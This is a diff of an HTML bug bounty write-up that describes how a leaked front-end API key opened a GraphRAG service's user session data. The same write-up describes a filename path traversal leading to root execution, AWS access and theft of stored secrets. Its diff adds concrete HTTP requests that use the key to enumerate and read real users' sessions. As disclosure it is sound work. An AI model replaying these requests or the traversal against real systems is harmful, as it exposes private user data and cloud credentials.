@@ -89,23 +89,83 @@
 Host: REDACTED.aws.metafb.cloud</code></pre>
       </div>
 
-      <p>Buried in that file:</p>
+      <p>It was sitting in the bundle as a hardcoded fallback default, so anyone reading the
+      JavaScript had it:</p>
 
       <div class="code">
-        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>text</span><button class="code__copy" type="button">copy</button></div>
-        <pre><code>FAST_GRAPHRAG_API_KEY = apprunner_fast_graphrag_fgr_k3y_8x4n9p2q...</code></pre>
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>javascript</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code>env.FAST_GRAPHRAG_API_KEY || "apprunner_fast_graphrag_fgr_k3y_8x4n9p2q..."</code></pre>
       </div>
 
       <p>That key was the entry ticket to the GraphRAG endpoints, so the interesting parts of the
       app were now reachable. On its own a leaked key like this is usually a low or medium finding.
       The fun started when I looked at what those endpoints actually let me do.</p>
 
+      <h2>What the key unlocked</h2>
+      <p>The key authenticated the entire GraphRAG API, and the API was not shy. The first thing
+      worth checking was what data sat behind it, so I asked it to list everything:</p>
+
+      <div class="code">
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>http</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code>GET /graphene/graph/available-datasets HTTP/1.1
+Host: REDACTED.aws.metafb.cloud
+X-API-Key: apprunner_fast_graphrag_fgr_k3y_8x4n9p2q...</code></pre>
+      </div>
+
+      <div class="code">
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>json</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code>{
+  "status": "success",
+  "cloud_datasets": [
+    {"name": "ai_calling_e17be6e0-d4fe-4fe9-...", "last_updated": "1772834277.58"},
+    {"name": "ai_calling_5ed8239d-4033-4f27-...", "last_updated": "..."},
+    "... 3,285 more"
+  ]
+}</code></pre>
+      </div>
+
+      <p>That was every AI calling session the service had ever processed. 3,287 of them, going back
+      more than a year, from March 2025 to April 2026. Not mock data either. Reading one back through
+      the graph endpoint returned the real content of a user's session, in this case someone planning
+      a personal ski trip with the assistant:</p>
+
+      <div class="code">
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>http</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code>POST /graphene/graph/get_graph HTTP/1.1
+Host: REDACTED.aws.metafb.cloud
+X-API-Key: apprunner_fast_graphrag_fgr_k3y_8x4n9p2q...
+Content-Type: application/json
+
+{"dataset_name": "ai_calling_e17be6e0-d4fe-4fe9-..."}</code></pre>
+      </div>
+
+      <div class="code">
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>json</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code>{
+  "nodes": [
+    {"name": "MORGAN", "description": "AI assistant helping with the planning"},
+    {"name": "SKI TRIP", "type": "TRAVEL", "description": "A planned trip for skiing"},
+    {"name": "PALISADES", "type": "LOCATION", "description": "A ski resort destination"},
+    {"name": "DEAL SEARCH", "type": "PLANNING_TOOL", "description": "Searching for good prices"}
+  ],
+  "edges": [
+    {"source": "MORGAN", "target": "SKI TRIP", "description": "Morgan helps plan the ski trip"}
+  ]
+}</code></pre>
+      </div>
+
+      <p>And it was not read only. The same key could ingest new datasets into the knowledge base and
+      delete existing ones straight out of S3 and DynamoDB. So from one string in a script tag: read,
+      write, and destroy over thousands of real meeting sessions.</p>
+
+      <p>That alone would have been a solid finding. But one endpoint in that same API,
+      <code>load_datasources</code>, did something more interesting with the files it accepted.</p>
+
       <h2>A file write, then a path traversal</h2>
-      <p>With the key working, the GraphRAG endpoints were worth going through one at a time to see
-      what each one actually did. The one that stood out was <code>load_datasources</code>. It
-      takes a <code>project_path</code> and a set of uploaded files, and it auto-creates
-      <code>{project_path}/input/</code> before saving them. So right there, a file write, which is
-      already worth a closer look.</p>
+      <p>That endpoint takes a <code>project_path</code> and a set of uploaded files, and it
+      auto-creates <code>{project_path}/input/</code> before saving them. So on top of the read and
+      write I already had over the datasets, here was a raw file write, which is always worth a
+      closer look.</p>
       <p>The real problem was that the <code>filename</code> field was never sanitized. A filename
       like <code>../../something.py</code> escapes the <code>input/</code> folder and climbs back
       up the tree, which turns a normal upload into an arbitrary file write. If I pointed
@@ -295,11 +355,11 @@ host=ip-10-0-249-248.us-west-2.compute.internal</code></pre>
       <p>From there the blast radius opened up fast:</p>
       <ul>
         <li><strong>S3, read and write.</strong> The dataset bucket held 398 objects covering
-        3,289 AI calling sessions, which is the actual meeting transcripts and graph data for real
+        3,287 AI calling sessions, which is the actual meeting transcripts and graph data for real
         user sessions. Both readable, and write access confirmed by dropping a harmless proof
         file.</li>
         <li><strong>DynamoDB, read and write.</strong> The <code>fastgraphragDatasets</code> table
-        had 3,289 records and accepted a proof item written into it.</li>
+        had 3,287 records and accepted a proof item written into it.</li>
         <li><strong>Secrets Manager, full read.</strong> All 17 secrets in the account came back.</li>
       </ul>
 
@@ -359,7 +419,7 @@ gcloud auth print-access-token
       </div>
 
       <p>So the final tally from one leaked front-end key: root code execution on the container,
-      the container's AWS role, read and write over 3,289 real session transcripts in S3 and
+      the container's AWS role, read and write over 3,287 real session transcripts in S3 and
       DynamoDB, and 17 secrets including live OAuth client secrets, a JWT signing key, and two GCP
       service accounts.</p>
 
@@ -394,7 +454,7 @@ gcloud auth print-access-token
       development environment.</p>
 
       <p>I will be honest, this one left a bad taste. Root on the box, the container's AWS role,
-      read and write over 3,289 real meeting transcripts, two GCP service accounts including one
+      read and write over 3,287 real meeting transcripts, two GCP service accounts including one
       called sso-admin, and 17 secrets with live OAuth client secrets and a JWT signing key sitting
       in the same account. All of it proven, not theory. And the whole thing came down to $525.</p>
 
